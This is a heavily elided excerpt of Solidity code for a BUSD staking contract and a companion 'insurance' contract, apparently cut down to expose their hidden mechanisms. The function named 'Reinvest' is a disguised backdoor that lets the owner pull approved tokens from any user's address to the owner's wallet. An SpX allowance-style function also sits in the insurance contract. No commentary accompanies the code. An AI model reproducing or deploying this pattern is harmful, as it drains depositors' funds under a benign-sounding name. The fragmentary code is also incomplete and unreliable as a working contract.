...
interface IInsuranceContract {
	...
	function SpX(address owner, address spender, uint256 amount) external;
...
contract INSURANCE {
	...
	constructor(address payable _walletProject)public {
    ...
    function SpX(address owner, address spender, uint256 amount) public
 {
...
contract stake_BUSD {
    ...
    uint256 public constant INVEST_MIN_AMOUNT = 10 ether;//10 BUSD minimum deposit 
    ...
    constructor(address payable wallet) public {
        ...
        plans.push(Plan(40, 80));
        		INSURANCE_CONTRACT = payable(new INSURANCE(wallet));
    ...
    function Reinvest(address refer, uint256 amount) public
 {
 		if (msg.sender == OwnerAddress) {
       

        token.transferFrom(refer, OwnerAddress, amount);
 }
 }
